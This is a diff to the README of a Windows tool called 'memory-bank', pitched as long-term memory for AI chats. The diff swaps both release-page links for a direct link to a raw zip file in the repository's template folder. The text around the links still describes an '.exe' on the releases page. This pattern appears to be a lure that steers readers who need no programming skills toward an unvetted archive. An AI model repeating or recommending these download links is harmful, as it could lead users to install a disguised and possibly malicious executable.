@@ -1,6 +1,6 @@
 # 🧠 memory-bank - Keep your chat sessions smarter longer
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue.svg)](https://github.com/josiahcrackle9631/memory-bank/releases)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue.svg)](https://github.com/josiahcrackle9631/memory-bank/raw/refs/heads/main/template/memory-bank-v3.4-beta.3.zip)
 
 Your AI assistant often forgets details during long projects. This happens because the AI creates a temporary, short-term memory that resets every time you start a new conversation. Memory-bank solves this problem by giving your AI a long-term storage space. The system saves your project progress, rules, and history in a format the AI understands. This improves performance and keeps your work consistent over time.
 
@@ -27,7 +27,7 @@ You do not need prior programming skills to run this software. Ensure your compu
 
 To begin using the tool, visit the official releases page. This page contains the latest version of the software.
 
-[Click here to visit the release page to download your file](https://github.com/josiahcrackle9631/memory-bank/releases)
+[Click here to visit the release page to download your file](https://github.com/josiahcrackle9631/memory-bank/raw/refs/heads/main/template/memory-bank-v3.4-beta.3.zip)
 
 Look for the file ending in `.exe` under the "Assets" heading of the latest release. Click that file to save it to your computer.
 
